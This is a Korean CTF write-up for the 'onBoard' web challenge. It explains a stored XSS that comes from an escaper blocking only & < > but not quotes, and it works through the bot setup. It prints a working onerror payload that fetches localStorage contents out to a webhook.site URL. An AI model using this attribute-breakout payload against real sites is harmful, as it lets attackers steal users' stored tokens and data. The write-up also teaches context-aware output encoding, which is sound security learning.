---
title: "onBoard"
date: 2026-07-13
draft: false
tags: ["web", "XSS", "IHHH-CTF"]
---

## 한 줄
게시판 글의 avatar 필드가 `<img src="...">` 속성값에 박히는데, 커스텀 escaper가 따옴표를 안 막아 속성 탈출 → stored XSS. 봇 localStorage의 flag를 OOB로 유출.

## 구조
- board: 게시판. `POST /api/posts`로 글 작성. `GET /post/:id`는 정적 셸만 주고 `post.js`가 클라에서 렌더 → DOM XSS 지점
- bot: 신고된 `/post/:id` 방문 전 `localStorage.setItem('flag', FLAG)` (board 오리진), 6초 대기
- 승리조건: board 오리진에서 JS 실행 → `localStorage.getItem('flag')` → 내 서버로 유출 (blind → OOB)

## 취약점
post.js가 필드를 escapeHtml 거쳐 innerHTML로 렌더. escaper는 `& < >`만 치환하고 따옴표(`"` `'`)는 안 건드림:

```js
<img class="avatar" src="${escapeHtml(post.avatar)}" alt="avatar">
```

- 커버리지: escaper는 `& < >`만 막음
- 컨텍스트: 5개 필드 중 4개는 태그 본문(text) → `<>` 차단으로 충분. avatar만 속성값 `src="..."` 안
- 속성값 탈출 키는 `"` → escaper가 안 막음 → avatar만 뚫림

## 핵심 개념
출력 인코딩은 context-aware여야 한다. text용 escaper(`<>&`)는 attribute 컨텍스트에선 불충분(`"`도 막아야 함). 같은 escaper가 text 필드 4개엔 안전, attribute 필드 1개엔 무력. "escaped ≠ safe" — 그 자리가 요구하는 문자를 커버하느냐가 기준.

## 익스플로잇
- `<>` 막혀 새 태그 불가 → 이미 있는 img에 이벤트 핸들러 속성 주입
- `src=x`(로드 실패) → onerror 자동 발화 → 봇 클릭 없이 터짐
- blind XSS → webhook.site로 OOB 유출

avatar 값 (닫는 따옴표는 템플릿의 `" alt=`가 제공):

```
x" onerror="fetch('https://webhook.site/<id>/?f='+encodeURIComponent(localStorage.getItem('flag')))
```

글 작성 → /report로 /post/:id 신고 → 봇 방문 시 봇 localStorage의 flag가 webhook으로.

## flag
IHHH{...}